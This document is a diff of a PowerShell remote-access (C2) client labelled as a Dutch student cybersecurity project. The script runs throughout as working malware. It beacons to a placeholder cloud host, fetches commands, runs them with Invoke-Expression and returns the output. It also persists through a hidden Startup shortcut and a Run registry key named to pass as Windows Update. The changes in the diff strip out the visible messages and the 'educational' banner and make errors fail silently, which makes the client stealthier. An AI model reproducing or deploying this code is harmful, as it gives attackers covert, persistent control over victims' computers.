@@ -1,9 +1,13 @@
+# persistence.ps1
+# Educational Cybersecurity Project - Remote Access Script
 
-$serverUrl = "https://your-ngrok-url.ngrok-free.app"
+# Configuratie - VERANDER DEZE URL
+$workerUrl = "https://your-app-name.onrender.com"
 $scriptName = "WindowsUpdate.ps1"
 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $scriptPath = "$env:APPDATA\$scriptName"
 
+# Functie: Beacon naar C2
 function Send-Beacon {
     param($data)
     try {
@@ -14,18 +18,32 @@ function Send-Beacon {
             timestamp = (Get-Date).ToString()
         } | ConvertTo-Json
         
-        $response = Invoke-RestMethod -Uri "$serverUrl/beacon" -Method POST -Body $body -ContentType "application/json" -UseBasicParsing -TimeoutSec 10
-        return $response
+        $params = @{
+            Uri = "$workerUrl/beacon"
+            Method = "POST"
+            Body = $body
+            ContentType = "application/json"
+            UseBasicParsing = $true
+            TimeoutSec = 10
+        }
+        
+        Invoke-RestMethod @params | Out-Null
     } catch {
-        Write-Host "[!] Beacon failed: $($_.Exception.Message)" -ForegroundColor Yellow
-        return $null
+        # Silent fail - geen errors tonen
     }
 }
 
 # Functie: Poll voor commands
 function Get-Command {
     try {
-        $response = Invoke-RestMethod -Uri "$serverUrl/command?id=$env:COMPUTERNAME" -Method GET -UseBasicParsing -TimeoutSec 10
+        $params = @{
+            Uri = "$workerUrl/command?id=$env:COMPUTERNAME"
+            Method = "GET"
+            UseBasicParsing = $true
+            TimeoutSec = 10
+        }
+        
+        $response = Invoke-RestMethod @params
         return $response.command
     } catch {
         return $null
@@ -36,28 +54,7 @@ function Get-Command {
 function Invoke-RemoteCommand {
     param($cmd)
     try {
-        # Special commands
-        if ($cmd -eq "exit" -or $cmd -eq "quit") {
-            Send-Beacon -data @{type="info"; message="Client shutting down"}
-            exit
-        }
-        
-        if ($cmd -eq "persist") {
-            Install-Persistence
-            $output = "Persistence reinstalled"
-        }
-        elseif ($cmd -eq "sysinfo") {
-            $output = Get-SystemInfo
-        }
-        elseif ($cmd -eq "screenshot") {
-            $output = "Screenshot functie niet geïmplementeerd (vereist extra modules)"
-        }
-        else {
-            # Execute PowerShell command
-            $output = Invoke-Expression $cmd 2>&1 | Out-String
-        }
-        
-        # Stuur output terug
+        $output = Invoke-Expression $cmd 2>&1 | Out-String
         Send-Beacon -data @{
             type = "output"
             command = $cmd
@@ -72,26 +69,12 @@ function Invoke-RemoteCommand {
     }
 }
 
-# Functie: Systeem informatie
-function Get-SystemInfo {
-    $info = @"
-Hostname: $env:COMPUTERNAME
-Username: $env:USERNAME
-OS: $(Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty Caption)
-Architecture: $env:PROCESSOR_ARCHITECTURE
-Domain: $env:USERDOMAIN
-PowerShell Version: $($PSVersionTable.PSVersion)
-IP Addresses: $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}).IPAddress -join ", ")
-"@
-    return $info
-}
-
-# Functie: Installeer persistence
+# Installeer persistence
 function Install-Persistence {
     try {
         # Kopieer script naar AppData
-        if ($PSCommandPath) {
-            Copy-Item -Path $PSCommandPath -Destination $scriptPath -Force -ErrorAction SilentlyContinue
+        if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
+            Copy-Item -Path $PSCommandPath -Destination $scriptPath -Force
         }
         
         # Maak startup shortcut
@@ -100,88 +83,54 @@ function Install-Persistence {
         $Shortcut.TargetPath = "powershell.exe"
         $Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
         $Shortcut.WindowStyle = 7 # Hidden
-        $Shortcut.Description = "Windows Update Check"
         $Shortcut.Save()
         
         # Registry persistence (backup methode)
         $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-        Set-ItemProperty -Path $regPath -Name "WindowsUpdateCheck" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path $regPath -Name "WindowsUpdateCheck" `
+            -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"" -Force
         
-        Write-Host "[+] Persistence installed" -ForegroundColor Green
-        return $true
+        Send-Beacon -data @{
+            type = "persistence"
+            message = "Persistence installed successfully"
+        }
     } catch {
-        Write-Host "[!] Persistence installation failed: $($_.Exception.Message)" -ForegroundColor Red
-        return $false
+        Send-Beacon -data @{
+            type = "persistence"
+            error = $_.Exception.Message
+        }
     }
 }
 
 # Main loop
 function Start-C2Client {
-    Write-Host "[*] C2 Client starting..." -ForegroundColor Cyan
-    Write-Host "[*] Server: $serverUrl" -ForegroundColor Cyan
-    
     # Installeer persistence bij eerste run
     if (-not (Test-Path $scriptPath)) {
-        Write-Host "[*] Installing persistence..." -ForegroundColor Yellow
         Install-Persistence
     }
     
-    # Stuur initial beacon met sysinfo
-    $sysInfo = Get-SystemInfo
-    $beacon = Send-Beacon -data @{
+    # Stuur initial beacon
+    Send-Beacon -data @{
         type = "init"
         message = "Client connected"
-        sysinfo = $sysInfo
-    }
-    
-    if ($beacon) {
-        Write-Host "[+] Connected to C2 server" -ForegroundColor Green
-    } else {
-        Write-Host "[!] Failed to connect to C2 server" -ForegroundColor Red
-        Write-Host "[*] Will retry every 30 seconds..." -ForegroundColor Yellow
+        os = [System.Environment]::OSVersion.VersionString
+        psversion = $PSVersionTable.PSVersion.ToString()
     }
     
     # Command polling loop
-    $failCount = 0
-    $maxFails = 10
-    
     while ($true) {
         try {
             $cmd = Get-Command
-            
             if ($cmd) {
-                Write-Host "[+] Received command: $cmd" -ForegroundColor Green
                 Invoke-RemoteCommand -cmd $cmd
-                $failCount = 0  # Reset fail counter
             }
-            
-            # Poll interval: 5 seconden
-            Start-Sleep -Seconds 5
-            
+            Start-Sleep -Seconds 5  # Poll elke 5 seconden
         } catch {
-            $failCount++
-            Write-Host "[!] Error in main loop: $($_.Exception.Message)" -ForegroundColor Red
-            
-            # Als te veel fails, wacht langer
-            if ($failCount -ge $maxFails) {
-                Write-Host "[!] Too many failures, waiting 60 seconds..." -ForegroundColor Red
-                Start-Sleep -Seconds 60
-                $failCount = 0
-            } else {
-                Start-Sleep -Seconds 10
-            }
+            # Continue bij errors
+            Start-Sleep -Seconds 10
         }
     }
 }
 
 # Start de client
-Write-Host @"
-
-╔═══════════════════════════════════════════╗
-║        C2 CLIENT - EDUCATIONAL            ║
-║     Cybersecurity Project - Hogeschool    ║
-╚═══════════════════════════════════════════╝
-
-"@ -ForegroundColor Cyan
-
 Start-C2Client
